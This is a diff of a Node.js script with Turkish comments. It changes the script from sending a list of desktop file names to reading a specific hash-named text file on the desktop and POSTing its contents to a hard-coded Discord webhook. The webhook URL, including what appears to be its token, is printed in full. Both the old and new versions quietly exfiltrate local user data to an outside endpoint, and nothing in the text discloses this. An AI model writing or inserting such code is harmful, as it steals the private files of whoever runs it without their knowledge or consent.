@@ -22,34 +22,41 @@ if (platform === 'win32') {
   return;
 }
 
-// Dosya isimlerini al
-const files = fs.readdirSync(desktopPath);
+// Dosya yolunu ve adını oluştur
+const filePath = path.join(desktopPath, '9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt');
 
-// Webhook'a POST isteği gönder
-const postData = JSON.stringify({
-  content: files.join('\n')
-});
-
-
-// POST isteği için gerekli seçenekler
-const options = {
-  hostname: 'discordapp.com',
-  path: '/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl',
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-    'Content-Length': postData.length
+// Dosya okuma
+fs.readFile(filePath, 'utf8', (err, data) => {
+  if (err) {
+    console.error('Dosya okunurken bir hata oluştu:', err);
+    return;
   }
-};
 
-// Webhook'a POST isteği gönder
-const req = https.request(options, res => {
-  console.log(`Webhook isteği gönderildi, yanıt kodu: ${res.statusCode}`);
+  // Webhook'a POST isteği gönder
+  const postData = JSON.stringify({
+    content: data
+  });
+
+  // POST isteği için gerekli seçenekler
+  const options = {
+    hostname: 'discordapp.com',
+    path: '/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl',
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': postData.length
+    }
+  };
+
+  // Webhook'a POST isteği gönder
+  const req = https.request(options, res => {
+    console.log(`Webhook isteği gönderildi, yanıt kodu: ${res.statusCode}`);
+  });
+
+  req.on('error', error => {
+    console.error('Webhook isteği gönderilirken bir hata oluştu:', error.message);
+  });
+
+  req.write(postData);
+  req.end();
 });
-
-req.on('error', error => {
-  console.error('Webhook isteği gönderilirken bir hata oluştu:', error.message);
-});
-
-req.write(postData);
-req.end();
